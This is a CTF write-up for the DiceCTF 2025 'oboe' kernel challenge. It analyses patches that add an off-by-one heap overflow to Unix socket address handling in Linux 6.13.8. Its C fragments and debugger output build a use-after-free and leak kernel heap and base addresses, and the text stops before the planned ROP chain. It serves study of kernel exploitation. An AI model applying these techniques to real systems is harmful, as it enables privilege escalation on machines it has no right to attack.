---
title: "oboe - DiceCTF 2025 Quals"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "heap", "off-by-one", "canary", "memcpy", "stack", "dicectf-2025-quals", "2025", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #40215"
  url: "https://ctftime.org/writeup/40215"
original_source: "https://7rocky.github.io/en/ctf/other/dicectf/oboe/"
ctf:
  name: "DiceCTF 2025 Quals"
  year: 2025
  challenge: "oboe"
---

## Metadata

- **CTF:** DiceCTF 2025 Quals
- **Task:** oboe
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/40215>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/dicectf/oboe/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given the Linux kernel (version 6.13.8) with some patches applied in the following `Dockerfile`:

`

```
    FROM ubuntu:24.04 AS build
    
    ARG KVER=6.13.8
    
    ENV DEBIAN_FRONTEND=noninteractive
    RUN apt-get update && apt-get install -yq --no-install-recommends \
        bc bison build-essential cpio flex libelf-dev libssl-dev python3 \
      && rm -rf /var/lib/apt/lists/*
    
    WORKDIR /build
    ADD https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-${KVER}.tar.xz /build/
    RUN tar -xf linux-${KVER}.tar.xz && mv linux-${KVER} linux
    WORKDIR /build/linux
    COPY kconfig .config
    COPY af_unix.c.patch .
    RUN sed -i '0,/BUG/s/BUG/\/\/BUG/' net/socket.c
    RUN sed -i '0,/gets/{/gets/s/^/__attribute__((no_stack_protector)) /}' net/socket.c
    RUN patch -p1 < af_unix.c.patch
    RUN make -j$(nproc)
    
    FROM scratch AS export
    COPY --from=build /build/linux/arch/x86/boot/bzImage /
```

`

We are also given the following files, which are somewhat usual on a kernel exploitation challenge:

`

```
    $ ls
    Dockerfile    af_unix.c.patch    initramfs.cpio.gz    linux.dockerfile
    Makefile      bzImage            kconfig              run
```

`

I’ll try to do a detailed writeup on this challenge, breaking down the debugging environment, source code analysis, exploitation strategy, and exploit development. Besides, I have to admit that I only know the basics of kernel exploitation, so there might be some concepts that are not precise, I’ll do my best.

## Setup environment

We can start by downloading the kernel source code and applying the patches following the steps in the `Dockerfile`. For debugging purposes, we can add some properties to the `.config` file: `CONFIG_DEBUG_INFO=y` to keep symbols in the `vmlinux` image and `CONFIG_DEBUG_DWARF4=y` to enable source code support in GDB, which might be handy this time. Then, we call `make` and wait for some time. The output is a `vmlinux` file and a compressed image, normally named `bzImage` or `vmlinuz`.

On the other hand, we have `initramfs.cpio.gz`, which is the base filesystem. We can decompress it using `gzip` and `cpio`. In many kernel challenges, we need to decompress the filesystem to find a vulnerable driver. This time, the filesystem does not contain anything important:

`

```
    $ mkdir initramfs
    
    $ gzip -kd initramfs.cpio.gz
    
    $ cd initramfs
    
    $ cpio -i < ../initramfs.cpio
    2359 blocks
    
    $ rm ../initramfs.cpio
    
    $ ls
    bin  flag  init  sbin  usr
```

`

In kernel challenges, we will code the exploit in C, and the compiled binary will have to be inside the filesystem before the emulation starts. For this reason, we must compile the exploit, copy the binary in the filesystem, compress the filesystem and finally emulate the kernel. Usually, the emulation parameters and `qemu` command are in a script called `run` or similar:

`

```
    qemu-system-x86_64 \
            -kernel bzImage \
            -initrd initramfs.cpio.gz \
            -monitor none \
            -append "console=ttyS0 quiet oops=panic" \
            -cpu qemu64,+smep,+smap \
            -m 128M \
            -nographic \
            -no-reboot
```

`

Exploit development in kernel challenges is more time-consuming because the above process takes some time. I normally use a script like the following to do everything at once:

`

```
    #!/usr/bin/env bash
    
    musl-gcc -static -o solve solve.c || exit 1
    mv solve initramfs
    cd initramfs
    
    find . -print0 \
    | cpio --null -ov --format=newc 2>/dev/null \
    | gzip -9 > ../initramfs.cpio.gz
    
    cd ..
    
    qemu-system-x86_64 \
            -kernel bzImage \
            -initrd initramfs.cpio.gz \
            -monitor none \
            -append "console=ttyS0 quiet oops=panic nokaslr" \
            -cpu qemu64,+smep,+smap \
            -m 128M \
            -nographic \
            -no-reboot \
            -s
```

`

Notice that I used a `-s` flag in the `qemu` command, which enables remote debugging on port 1234. Also, I added `nokaslr` in the `-append` flag, to make debugging easier, although we will write the exploit as if KASLR was enabled.

Last but not least, we must modify the `init` script inside the filesystem to login directly as `root` inside the kernel. This is necessary to read `/proc/kallsyms`:

`

```
    - setsid /bin/cttyhack setuidgid 1000 /bin/sh
    + setsid /bin/cttyhack setuidgid 0 /bin/sh
```

`

In order to use the fresh-compiled `bzImage`, we can backup the given one and use a symbolic link:

`

```
    $ mv bzImage bzImage_orig
    
    $ ln -s linux-6.13.8/arch/x86/boot/bzImage bzImage
```

`

At this point, we can write a simple program in a `solve.c` file and use the script to run it on the kernel, as a sanity check.

## Source code analysis

In this section, we will identify vulnerabilities present in the patched source code, and the structures and functions involved. I recommend using a good code editor to be able to search through several files, jump to definition, find function calls, etc.

### Patches

Let’s review the patches that have been applied to the kernel source code.

  * The most notable patch comes in `af_unix.patch`:


`

```
    RUN patch -p1 < af_unix.c.patch
```

`

`

```
    --- a/net/unix/af_unix.c
    +++ b/net/unix/af_unix.c
    @@ -325,7 +325,7 @@
     
      refcount_set(&addr->refcnt, 1);
      addr->len = addr_len;
    - memcpy(addr->name, sunaddr, addr_len);
    + memcpy(addr->name, sunaddr, addr_len + 1);
     
      return addr;
     }
```

`

This is the entire function:

`

```
    static struct unix_address *unix_create_addr(struct sockaddr_un *sunaddr,
                   int addr_len)
    {
      struct unix_address *addr;
    
      addr = kmalloc(sizeof(*addr) + addr_len, GFP_KERNEL);
      if (!addr)
        return NULL;
    
      refcount_set(&addr->refcnt, 1);
      addr->len = addr_len;
      memcpy(addr->name, sunaddr, addr_len + 1);
    
      return addr;
    }
```

`

The above function has a one-byte overflow, also known as off-by-one, on a heap structure called `unix_address`.

  * This one removes the stack canary:


`

```
    RUN sed -i '0,/gets/{/gets/s/^/__attribute__((no_stack_protector)) /}' net/socket.c
```

`

The affected function is `getsockname`:

`

```
    /*
     *  Get the local address ('name') of a socket object. Move the obtained
     *  name to user space.
     */
    
    __attribute__((no_stack_protector)) int __sys_getsockname(int fd, struct sockaddr __user *usockaddr,
              int __user *usockaddr_len)
    {
      struct socket *sock;
      struct sockaddr_storage address;
      CLASS(fd, f)(fd);
      int err;
    
      if (fd_empty(f))
        return -EBADF;
      sock = sock_from_file(fd_file(f));
      if (unlikely(!sock))
        return -ENOTSOCK;
    
      err = security_socket_getsockname(sock);
      if (err)
        return err;
    
      err = READ_ONCE(sock->ops)->getname(sock, (struct sockaddr *)&address, 0);
      if (err < 0)
        return err;
    
      /* "err" is actually length in this case */
      return move_addr_to_user(&address, err, usockaddr, usockaddr_len);
    }
    
    SYSCALL_DEFINE3(getsockname, int, fd, struct sockaddr __user *, usockaddr,
        int __user *, usockaddr_len)
    {
      return __sys_getsockname(fd, usockaddr, usockaddr_len);
    }
```

`

Why would they remove the stack canary? Well, the answer comes with the next patch.

  * This one comments out a specific line of code:


`

```
    RUN sed -i '0,/BUG/s/BUG/\/\/BUG/' net/socket.c
```

`

The affected function is `move_addr_to_user`, which was called by `__sys_getsockname`:

`

```
    /**
     *  move_addr_to_user - copy an address to user space
     *  @kaddr: kernel space address
     *  @klen: length of address in kernel
     *  @uaddr: user space address
     *  @ulen: pointer to user length field
     *
     *  The value pointed to by ulen on entry is the buffer length available.
     *  This is overwritten with the buffer space used. -EINVAL is returned
     *  if an overlong buffer is specified or a negative buffer size. -EFAULT
     *  is returned if either the buffer or the length field are not
     *  accessible.
     *  After copying the data up to the limit the user specifies, the true
     *  length of the data is written over the length limit the user
     *  specified. Zero is returned for a success.
     */
    
    static int move_addr_to_user(struct sockaddr_storage *kaddr, int klen,
               void __user *uaddr, int __user *ulen)
    {
      int err;
      int len;
    
      //BUG_ON(klen > sizeof(struct sockaddr_storage));
      err = get_user(len, ulen);
      if (err)
        return err;
      if (len > klen)
        len = klen;
      if (len < 0)
        return -EINVAL;
      if (len) {
        if (audit_sockaddr(klen, kaddr))
          return -ENOMEM;
        if (copy_to_user(uaddr, kaddr, len))
          return -EFAULT;
      }
      /*
       *      "fromlen shall refer to the value before truncation.."
       *                      1003.1g
       */
      return __put_user(klen, ulen);
    }
```

`

These two patches add a Buffer Overflow vulnerability if we can somehow control the value of `klen` and make it greater than `sizeof(struct sockaddr_storage)`, because they have removed the check.

On the one hand, we can leak information beyond the `sockaddr_storage` structure because `move_addr_to_user` will copy the amount of bytes we specified into a user-controlled buffer. On the other hand, `READ_ONCE(sock->ops)->getname` will actually call `unix_getname` because we will be dealing with Unix domain sockets (UDS), and there is a `memcpy` instruction on a stack variable (that comes from `__sys_getsockname`) using the value `addr->len` that we might be able to control:

`

```
    static int unix_getname(struct socket *sock, struct sockaddr *uaddr, int peer)
    {
      struct sock *sk = sock->sk;
      struct unix_address *addr;
      DECLARE_SOCKADDR(struct sockaddr_un *, sunaddr, uaddr);
      int err = 0;
    
      // ...
    
      addr = smp_load_acquire(&unix_sk(sk)->addr);
      if (!addr) {
        // ...
      } else {
        err = addr->len;
        memcpy(sunaddr, addr->name, addr->len);
    
        // ...
      }
      sock_put(sk);
    out:
      return err;
    }
```

`

Therefore, we will be able to leak memory addresses and overwrite the return address, without having to care about canaries because `__sys_getsockname` has this mitigation disabled.

So, in summary:

  * Off-by-one on a heap object corresponding to a `unix_address` structure
  * Buffer overflow to read in `__sys_getsockname` and `move_addr_to_user` as long as we control `klen`
  * Buffer overflow to write in `__sys_getsockname` and `unix_getname` as long as we control `klen`


### Structures

Now, let’s analyze the structures that might be involve in the exploit. First of all `unix_address`:

`

```
    struct unix_address {
      refcount_t  refcnt;
      int   len;
      struct sockaddr_un name[];
    };
```

`

As can be seen, this structure has a minimum size of 8 bytes since `refcount_t` is basically an `int` (4 bytes) and we have another `int` for `len`. Notice that the structure can have a variable size because `name` is an empty array. That’s the reason why this structure should be initialized dynamically with `kmalloc`. The following snippet comes from `unix_create_addr`, where we can control the value of `addr_len`:

`

```
      struct unix_address *addr;
    
      addr = kmalloc(sizeof(*addr) + addr_len, GFP_KERNEL);
```

`

The `refcnt` attribute is interesting, because it determines if the structure can be freed or not with `unix_release_addr`:

`

```
    static inline void unix_release_addr(struct unix_address *addr)
    {
      if (refcount_dec_and_test(&addr->refcnt))
        kfree(addr);
    }
```

`

The function `refcount_dec_and_test` decrements the `refcnt` value by `1` and returns `true` if the new value is `0`. If so happens, the `unix_address` object is freed using `kfree`.

Therefore, if we manage to modify the `refcnt` value of one of these objects, we might get a Use After Free (UAF) situation. Notice that this can be achieved if we exploit the off-by-one on two adjacent `unix_address` objects.

This is `sockaddr_un`, which appears in the `unix_address` structure:

`

```
    #define UNIX_PATH_MAX 108
    
    struct sockaddr_un {
      __kernel_sa_family_t sun_family; /* AF_UNIX */
      char sun_path[UNIX_PATH_MAX]; /* pathname */
    };
```

`

This one is a 110-byte structure because `__kernel_sa_family_t` is an alias for an `unsigned short`. This structure is relevant because it will be involved in the off-by-one exploitation (`sunaddr`):

`

```
      addr->len = addr_len;
      memcpy(addr->name, sunaddr, addr_len + 1);
```

`

### Functions

Now, let’s see how we can call each of the above functions. Since we will be dealing with Unix domain sockets, it is good to have a bit of knowledge on how they work. I’ll leave two resources that helped me understand the inner workings of these:

  * [Unix socket programming in C](https://how.dev/answers/unix-socket-programming-in-c)
  * [Getting Started With Unix Domain Sockets](https://medium.com/swlh/getting-started-with-unix-domain-sockets-4472c0db4eb1)


In brief, UDS are used for inter-process communication (IPC). The process is as follows:

  1. The server creates a socket (file descriptor)
  2. The server binds to a given name
  3. The server listens for connections (non-blocking)
  4. A client tries to connect
  5. The server accepts an incoming connection (blocking)
  6. Once a connection arrives, a new file descriptor is used to read and write


Each of these steps is managed with `syscall` instructions. We have function wrappers for each of the procedures, with a self-explanatory name: `socket`, `bind`, `listen`, `connect`, `accept`. Each of the `syscall` handlers is defined in `net/socket.c` under the name `__sys_<name>`. For example, this is `__sys_bind`:

`

```
    int __sys_bind(int fd, struct sockaddr __user *umyaddr, int addrlen)
    {
      struct socket *sock;
      struct sockaddr_storage address;
      CLASS(fd, f)(fd);
      int err;
    
      if (fd_empty(f))
        return -EBADF;
      sock = sock_from_file(fd_file(f));
      if (unlikely(!sock))
        return -ENOTSOCK;
    
      err = move_addr_to_kernel(umyaddr, addrlen, &address);
      if (unlikely(err))
        return err;
    
      return __sys_bind_socket(sock, &address, addrlen);
    }
    
    SYSCALL_DEFINE3(bind, int, fd, struct sockaddr __user *, umyaddr, int, addrlen)
    {
      return __sys_bind(fd, umyaddr, addrlen);
    }
```

`

This function is relevant because there is a `sockaddr_storage` variable allocated on the stack (`address`), where our user-controlled data is being copied. Then, the reference to this object is sent to `__sys_bind_socket`:

`

```
    int __sys_bind_socket(struct socket *sock, struct sockaddr_storage *address,
              int addrlen)
    {
      int err;
    
      err = security_socket_bind(sock, (struct sockaddr *)address,
               addrlen);
      if (!err)
        err = READ_ONCE(sock->ops)->bind(sock,
                 (struct sockaddr *)address,
                 addrlen);
      return err;
    }
```

`

This function calls the specific `bind` function of the socket implementation. In the case of UDS, it is `unix_bind`:

`

```
    static int unix_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
    {
      struct sockaddr_un *sunaddr = (struct sockaddr_un *)uaddr;
      struct sock *sk = sock->sk;
      int err;
    
      if (addr_len == offsetof(struct sockaddr_un, sun_path) &&
          sunaddr->sun_family == AF_UNIX)
        return unix_autobind(sk);
    
      err = unix_validate_addr(sunaddr, addr_len);
      if (err)
        return err;
    
      if (sunaddr->sun_path[0])
        err = unix_bind_bsd(sk, sunaddr, addr_len);
      else
        err = unix_bind_abstract(sk, sunaddr, addr_len);
    
      return err;
    }
```

`

Observe that `sunaddr` (retyped from `uaddr`) still references the stack variable `address` from `__sys_bind`.

In case `addr_len` is `2`, then `unix_autobind` is called, which implies that the user didn’t specify any name for the UDS. We don’t actually need this branch of execution, so we need to specify name and length values, so that `unix_validate_addr` is called:

`

```
    /*
     *  Check unix socket name:
     *    - should be not zero length.
     *          - if started by not zero, should be NULL terminated (FS object)
     *    - if started by zero, it is abstract name.
     */
    
    static int unix_validate_addr(struct sockaddr_un *sunaddr, int addr_len)
    {
      if (addr_len <= offsetof(struct sockaddr_un, sun_path) ||
          addr_len > sizeof(*sunaddr))
        return -EINVAL;
    
      if (sunaddr->sun_family != AF_UNIX)
        return -EINVAL;
    
      return 0;
    }
```

`

This function confirms we are using UDS (`AF_UNIX`) and that the given `addr_len` doesn’t exceed the size of a `sockaddr_un` structure (110 bytes).

After that, if the first byte of `sunaddr->sun_path` is not a null byte, the function `unix_bind_bsd` is called:

`

```
    static int unix_bind_bsd(struct sock *sk, struct sockaddr_un *sunaddr,
           int addr_len)
    {
      umode_t mode = S_IFSOCK |
             (SOCK_INODE(sk->sk_socket)->i_mode & ~current_umask());
      struct unix_sock *u = unix_sk(sk);
      unsigned int new_hash, old_hash;
      struct net *net = sock_net(sk);
      struct mnt_idmap *idmap;
      struct unix_address *addr;
      struct dentry *dentry;
      struct path parent;
      int err;
    
      addr_len = unix_mkname_bsd(sunaddr, addr_len);
      addr = unix_create_addr(sunaddr, addr_len);
      if (!addr)
        return -ENOMEM;
    
      // ...
    }
```

`

Notice that `addr_len` is updated in `unix_mkname_bsd` before calling `unix_create_addr` (remember this function is patched to have an off-by-one vulnerability). The update relies on `strlen`, so it might be harder to work with this function because of this.

On the other hand, if `sunaddr->sun_path` begins with a null byte, `unix_bind_abstract` is called instead:

`

```
    static int unix_bind_abstract(struct sock *sk, struct sockaddr_un *sunaddr,
                int addr_len)
    {
      struct unix_sock *u = unix_sk(sk);
      unsigned int new_hash, old_hash;
      struct net *net = sock_net(sk);
      struct unix_address *addr;
      int err;
    
      addr = unix_create_addr(sunaddr, addr_len);
      if (!addr)
        return -ENOMEM;
    
      // ...
    }
```

`

And this function simply calls `unix_create_addr` on the given `addr_len` value, so it’s more convenient for exploitation.

The rest of the UDS-involved functions are not that relevant to show-case here. The only point to mention is that `unix_stream_connect` (called by `__sys_connect`) increases the `refcnt` value of the corresponding `unix_address` object. Maybe another useful fact is that each call to `socket` allocates a 256-byte object (`struct file`) on kernel heap.

## Exploit stategy

The main bug we have is an off-by-one on the kernel heap, specifically in `unix_address` objects. The other two patches are meant to make a clear exploitation path. Let’s review it again:

`

```
    struct unix_address {
      refcount_t  refcnt;
      int   len;
      struct sockaddr_un name[];
    };
```

`

`

```
    static struct unix_address *unix_create_addr(struct sockaddr_un *sunaddr,
                   int addr_len)
    {
      struct unix_address *addr;
    
      addr = kmalloc(sizeof(*addr) + addr_len, GFP_KERNEL);
      if (!addr)
        return NULL;
    
      refcount_set(&addr->refcnt, 1);
      addr->len = addr_len;
      memcpy(addr->name, sunaddr, addr_len + 1);
    
      return addr;
    }
```

`

If we get two contiguous `unix_address` objects and use the top one to overflow the bottom one, we could modify its `refcnt` value:

![oboe 1](https://7rocky.github.io/images/other/DiceCTF/oboe-1.svg)

### Use After Free

The idea of this is to get a UAF situation. We can achieve this by:

  1. Binding two sockets, as in the above layout
  2. Listen and accept a connection from a client socket to the bottom binding, so that the `refcnt` is updated to `2` and we get two references to the same `unix_address` object (one for the server and one for the client)
  3. Free the top `unix_address` object and allocate again to exploit the off-by-one vulnerability. Especifically, we need to overflow with a byte `\x01`
  4. Now the `refcnt` value has been artificially modified to `1`, we can close the client socket file descriptor associated to the bottom `unix_address` object, so that the `refcnt` decreases to `0` and the object is freed
  5. At this point, the server socket file descriptor still holds a reference to this bottom `unix_address` object, although it has been freed


As a result, we can call `getsockname` on the UAF socket to leak memory addresses of the freed object (mainly kernel heap addresses).

Even, we can artificially modify the `len` value on the UAF socket so that we can use it as a Buffer Overflow for out-of-bounds read and write.

Also, we could try to allocate another kernel object that fits on this memory region and read from it using `getsockname` again. However, this won’t work because if `len` has a very large value (for instance, a kernel address), the function `unix_getname` will crash because of `memcpy(sunaddr, addr->name, addr->len)`, which is precisely the sentence that allows for out-of-bounds read if we control `addr->len`, but with a rather small value.

So, the high-level exploitation path is:

  1. Get a UAF situation on a `unix_address` object
  2. Read with `getsockname` to leak kernel heap addresses
  3. Modify the `len` value to enable out-of-bounds read and write
  4. Leak kernel addresses from a structure below the UAF object
  5. Modify the return address in `__sys_getsockname` to place a ROP chain and achieve Arbitrary Code Execution (ACE)


### Mitigations

For the last step, we need to take into account that SMEP, SMAP and KPTI are enabled (as well as KASLR). For some detailed explanations of these kernel protections, have a look at [Learning Linux Kernel Exploitation - Part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/) (actually, it is also good to read [Learning Linux Kernel Exploitation - Part 1](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) and [Learning Linux Kernel Exploitation - Part 3](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/) to learn even more about kernel exploitation basics).

In brief, SMEP blocks execution on user-land pages, so it can be bypassed with ROP; SMAP blocks access to user-land pages, so the only way to bypass it is to keep the ROP chain in kernel-land; and KPTI means that the kernel holds two sets of pages, one for kernel-land and one for user-land, but it can be easily bypassed using a so-called KPTI trampoline, which is how the kernel safely returns to user-land.

## Exploit development

Since we will be using UDS-related functions several times, it is worth writing some auxiliary functions for this purpose:

`

```
    void do_bind(int sockfd, char* sun_path, int addr_len) {
      struct sockaddr_un addr = { .sun_family = AF_UNIX, .sun_path = { 0 } };
    
      memcpy(addr.sun_path + 1, sun_path, 4);
    
      if (bind(sockfd, (struct sockaddr*) &addr, addr_len) < 0) {
        perror("bind");
        exit(errno);
      }
    }
    
    
    void do_connect(int sockfd, char* sun_path, int addr_len) {
      struct sockaddr_un addr = { .sun_family = AF_UNIX, .sun_path = { 0 } };
    
      memcpy(addr.sun_path + 1, sun_path, 4);
    
      if (connect(sockfd, (struct sockaddr*) &addr, addr_len) < 0) {
        perror("connect");
        exit(errno);
      }
    }
    
    
    int do_accept(int sockfd) {
      int fd = accept(sockfd, NULL, NULL);
    
      if (fd < 0) {
        perror("accept");
        exit(errno);
      }
    
      return fd;
    }
    
    
    void do_listen(int sockfd) {
      if (listen(sockfd, 1) < 0) {
        perror("listen");
        exit(errno);
      }
    }
    
    
    void do_getsockname(int sockfd, struct sockaddr_un* addr) {
      socklen_t len = 0x40;
    
      if (getsockname(sockfd, (struct sockaddr*) addr, &len) < 0) {
        perror("getsockname");
        exit(errno);
      }
    }
```

`

Notice how `do_bind` leaves `sunaddr->sun_path[0] = '\0'` so that the `unix_address` object is created with `unix_bind_abstract`.

### Leaking memory addresses

First of all, we will start by allocating a lot of `unix_address` objects:

`

```
      int spray[200];
    
      for (int i = 0; i < 200; i++) {
        spray[i] = socket(AF_UNIX, SOCK_STREAM, 0);
        char buf[8] = { 0 };
        sprintf(buf, "a%d", i);
        do_bind(spray[i], buf, 0x18 - 1);
      }
```

`

This is kind of a heap spray, but the only purpose of this is to consume slots in the slab that were freed before running the exploit, so that subsequent `unix_address` allocations are adjacent. This happens because of the following kernel configuration:

`

```
    #
    # Slab allocator options
    #
    CONFIG_SLUB=y
    CONFIG_SLAB_MERGE_DEFAULT=y
    # CONFIG_SLAB_FREELIST_RANDOM is not set
    # CONFIG_SLAB_FREELIST_HARDENED is not set
    # CONFIG_SLAB_BUCKETS is not set
    # CONFIG_SLUB_STATS is not set
    CONFIG_SLUB_CPU_PARTIAL=y
    # CONFIG_RANDOM_KMALLOC_CACHES is not set
    # end of Slab allocator options
```

`

The gist is that we are dealing with the SLUB allocator, with actually no mitigations, because free-list order is not randomized, not hardened and even we have `CONFIG_SLAB_MERGE_DEFAULT=y`, which means that caches like `GPF_KERNEL_ACCOUNT` and `GFP_KERNEL` are merged.

As a result, there is a very interesting structure called [`seq_operations`](https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/seq_file.h#L31) that we can use to get kernel leaks:

`

```
    struct seq_operations {
      void * (*start) (struct seq_file *m, loff_t *pos);
      void (*stop) (struct seq_file *m, void *v);
      void * (*next) (struct seq_file *m, void *v, loff_t *pos);
      int (*show) (struct seq_file *m, void *v);
    };
```

`

This structure gets allocated in `kmalloc-cg-32` (`GFP_KERNEL_ACCOUNT`), but the previous configuration will allocate it in `kmalloc-32`. The structure can be allocated by opening `/proc/self/stat`, and it will hold pointers to kernel functions, so it’s a good choice to get kernel leaks.

Even, it is useful to get `$rip` control, according to [ptr-yudai’s blog](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations) (in Japanese). Actually, I’ve used this structure a few times, for example in [knote](https://7rocky.github.io/en/ctf/htb-challenges/pwn/knote). But this time we won’t get `$rip` control with this technique, only memory leaks.

So, we are interested in `kmalloc-32`, which means that we need to use `sunaddr` values with a length of `0x18` (the remaining 8 bytes come from `refcnt` and `len`) to fit within the slab size. Therefore, the following objects will be allocated one after the other:

`

```
      do_bind(s1, "AAAA", 0x18 - 1);
      do_bind(s2, "BBBB", 0x18 - 1);
    
      int seq_fd = open("/proc/self/stat", O_RDONLY);
```

`

We can actually check it out in GDB (with [bata24’s `gef` fork](https://github.com/bata24/gef)). For this purpose, we can stop the exploit execution with `getchar`. However, we might get weird results because if our program takes too long to allocate on a specific spot, other processes will do instead, and the exploit will fail. As a result, this exploit is very difficult to debug step by step. This is also the reason why we allocate sockets at the start instead of between `bind` calls.

This is how `unix_address` objects are placed on the _heap_ :

`

```
    gef> search-pattern 0x0000001700000001
    [+] Searching '\x01\x00\x00\x00\x17\x00\x00\x00' in whole memory
    ...
    [+] In (0xffff888003a00000-0xffff888007e00000 [rw-] (0x4400000 bytes)
      ...
      0xffff8880043f1460:    01 00 00 00 17 00 00 00  01 00 00 61 31 39 39 00    |  ...........a199.  |
      0xffff8880043f1520:    01 00 00 00 17 00 00 00  01 00 00 41 41 41 41 00    |  ...........AAAA.  |
      0xffff8880043f1540:    01 00 00 00 17 00 00 00  01 00 00 42 42 42 42 00    |  ...........BBBB.  |
    ...
    gef> x/12gx 0xffff8880043f1520
    0xffff8880043f1520:     0x0000001700000001      0x0041414141000001
    0xffff8880043f1530:     0x0000000000000000      0xff00000000000000
    0xffff8880043f1540:     0x0000001700000001      0x0042424242000001
    0xffff8880043f1550:     0x0000000000000000      0xff00000000000000
    0xffff8880043f1560:     0xffffffff812e33b0      0xffffffff812e3400
    0xffff8880043f1570:     0xffffffff812e33e0      0xffffffff813438a0
    gef> telescope 0xffff8880043f1560 4 -n
          0xffff8880043f1560|+0x0000|+000: 0xffffffff812e33b0 <single_start>  ->  0x8348c031fa1e0ff3
          0xffff8880043f1568|+0x0008|+001: 0xffffffff812e3400 <single_stop>  ->  0xccccccc3fa1e0ff3
          0xffff8880043f1570|+0x0010|+002: 0xffffffff812e33e0 <single_next>  ->  0x01028348fa1e0ff3
          0xffff8880043f1578|+0x0018|+003: 0xffffffff813438a0 <proc_single_show>  ->  0xf6315641fa1e0ff3
```

`

Alright, now we need to increment the `refcnt` of the bottom `unix_address` object by doing the `listen`-`connect`-`accept` combo:

`

```
      do_listen(s2);
      do_connect(client_fd, "BBBB", 0x18 - 1);
      // refcnt = 2
      accept_fd = do_accept(s2);
```

`

`

```
    gef> x/12gx 0xffff8880043f1520
    0xffff8880043f1520:     0x0000001700000001      0x0041414141000001
    0xffff8880043f1530:     0x0000000000000000      0xff00000000000000
    0xffff8880043f1540:     0x0000001700000002      0x0042424242000001
    0xffff8880043f1550:     0x0000000000000000      0xff00000000000000
    0xffff8880043f1560:     0xffffffff812e33b0      0xffffffff812e3400
    0xffff8880043f1570:     0xffffffff812e33e0      0xffffffff813438a0
```

`

At this point, we must exploit the off-by-one vulnerability. If we do it directly, we wont’ have control on the overflowing byte, which will be either a null byte or some uninitialized value on the stack, but we need it to be exactly a `\x01` byte.

Remember that the `sunaddr` is copied from user-land to the kernel stack in `__sys_bind`. Therefore, if we allocate a UDS binding that is mostly filled with `\x01` bytes, we will have a high probability of getting the desired off-by-one:

`

```
      close(s1);
      socket(AF_UNIX, SOCK_STREAM, 0);
    
      struct sockaddr_un addr;
      memset(&addr, '\x01', sizeof(struct sockaddr_un));
      addr.sun_family = AF_UNIX;
      addr.sun_path[0] = '\0';
    
      // fill stack with '\x01'
      if (bind(s3, (struct sockaddr*) &addr, sizeof(struct sockaddr_un)) < 0) {
        perror("bind");
        exit(1);
      }
    
      // off-by-one (hopefully '\x01')
      // refcnt = 1
      do_bind(s4, "CCCC", 0x18);
```

`

`

```
    gef> x/12gx 0xffff8880043f1520
    0xffff8880043f1520:     0x0000001800000001      0x0043434343000001
    0xffff8880043f1530:     0x0000000000000000      0x0000000000000000
    0xffff8880043f1540:     0x0000001700000001      0x0042424242000001
    0xffff8880043f1550:     0x0000000000000000      0xff00000000000000
    0xffff8880043f1560:     0xffffffff812e33b0      0xffffffff812e3400
    0xffff8880043f1570:     0xffffffff812e33e0      0xffffffff813438a0
```

`

Now, we can free the victim `unix_address` object by closing the `client_fd` and `accept_fd` socket file descriptors:

`

```
      // refcnt = 0 -> kfree
      close(client_fd);
      close(accept_fd);
      socket(AF_UNIX, SOCK_STREAM, 0);
```

`

`

```
    gef> x/12gx 0xffff8880043f1520
    0xffff8880043f1520:     0x0000001700000001      0x0041414141000001
    0xffff8880043f1530:     0x0000000000000000      0x0000000000000000
    0xffff8880043f1540:     0x0000001700000000      0x0042424242000001
    0xffff8880043f1550:     0xffff8880043f1500      0xff00000000000000
    0xffff8880043f1560:     0xffffffff812e33b0      0xffffffff812e3400
    0xffff8880043f1570:     0xffffffff812e33e0      0xffffffff813438a0
```

`

With this, we have the `unix_address` object associated to `s2` in a UAF situation. Notice we can already leak the heap pointer `0xffff8880043f1500` with `getsockname`:

`

```
      struct sockaddr_un leak;
      do_getsockname(s2, &leak);
      unsigned long kheap = *((unsigned long*) &leak + 1);
    
      if (kheap == 0) {
        puts("Exploit failed...");
        exit(1);
      }
    
      printf("[*] kheap:        0x%lx\n", kheap);
      puts("");
```

`

Next, we can modify the `len` value by stomping a controlled `kmalloc-32` structure here. To achieve this, we can use [`setxattr`](https://elixir.bootlin.com/linux/v6.13.7/source/fs/xattr.c#L743), which is also mentioned in [ptr-yudai’s blog](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#setxattr). It is placed under “Heap Spray”, but it no longer applies for this purpose, because `setxattr` in kernel version 6.13.8 allocates an object with a user-controlled size and frees it right in the same function.

Still, we can use allocate `setxattr` to place a controlled `len` and then use `getsockname` again to perform an out-of-bounds read, so that we can leak pointers from the `seq_operations` structure:

`

```
      unsigned int payload1[16] = { 1, 0x30 };
      setxattr("/proc/self/stat", "pwn", payload1, 0x20, 0);
    
      do_getsockname(s2, &leak);
    
      printf("[*] single_start: 0x%lx\n", *((unsigned long*) &leak + 3));
      printf("[*] single_stop:  0x%lx\n", *((unsigned long*) &leak + 4));
      printf("[*] single_next:  0x%lx\n", *((unsigned long*) &leak + 5));
      puts("");
```

`

Next, we can find `kbase` by subtracting the offset (notice that KASLR will be enabled on the remote instance):

`

```
    gef> p/x 0xffffffff812e33b0 - $kbase
    $1 = 0x2e33b0
```

`

`

```
      unsigned long kbase = *((unsigned long*) &leak + 3) - SINGLE_START_OFFSET;
      printf("[+] kbase:        0x%lx\n", kbase);
      puts("");
```

`

### Arbitrary Code Execution

Up to this point, we have all the leaks required to craft a ROP chain to get `root` permissions. Remember that because of SMEP, SMAP and KPTI, we need the ROP chain to be written in kernel-land memory and use a KPTI trampoline to safely return to user-land.

